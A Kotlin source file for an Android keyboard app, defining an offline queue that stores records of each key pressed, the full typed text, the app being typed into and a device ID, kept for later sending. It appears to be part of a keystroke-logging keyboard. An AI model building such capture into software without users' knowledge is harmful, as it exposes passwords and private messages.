package com.keywordrecord.keyboard

import android.content.Context
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject

class OfflineQueue(context: Context) {
    private val prefs = context.applicationContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    private val lock = Any()

    fun enqueue(
        deviceUniqueId: String,
        keyPressed: String,
        fullText: String,
        appPackage: String,
        action: String
    ) {
        synchronized(lock) {
            val queue = readQueue()
            if (queue.length() >= MAX_ITEMS) {
                queue.remove(0)
            }
            queue.put(
                JSONObject().apply {
                    put("deviceUniqueId", deviceUniqueId)
                    put("keyPressed", keyPressed)
                    put("fullText", fullText)
                    put("appPackage", appPackage)
                    put("action", action)
                    put("queuedAt", System.currentTimeMillis())
                }
            )
            writeQueue(queue)
            val pendingCount = queue.length()
            Log.d(TAG, "Queued offline record. Pending=$pendingCount")
        }
    }

    fun peekAll(): List<JSONObject> {
        synchronized(lock) {
            val queue = readQueue()
            return buildList {
                for (i in 0 until queue.length()) {
                    add(queue.getJSONObject(i))
                }
            }
        }
    }

    fun removeFirst(count: Int) {
        if (count <= 0) return
        synchronized(lock) {
            val queue = readQueue()
            val next = JSONArray()
            for (i in count until queue.length()) {
                next.put(queue.getJSONObject(i))
            }
            writeQueue(next)
        }
    }

    fun size(): Int {
        synchronized(lock) {
            return readQueue().length()
        }
    }

    private fun readQueue(): JSONArray {
        val raw = prefs.getString(KEY_QUEUE, "[]") ?: "[]"
        return try {
            JSONArray(raw)
        } catch (_: Exception) {
            JSONArray()
        }
    }

    private fun writeQueue(queue: JSONArray) {
        prefs.edit().putString(KEY_QUEUE, queue.toString()).apply()
    }

    companion object {
        private const val TAG = "OfflineQueue"
        private const val PREFS_NAME = "keyword_record_offline_queue"
        private const val KEY_QUEUE = "pending_keystrokes"
        private const val MAX_ITEMS = 50000
    }
}
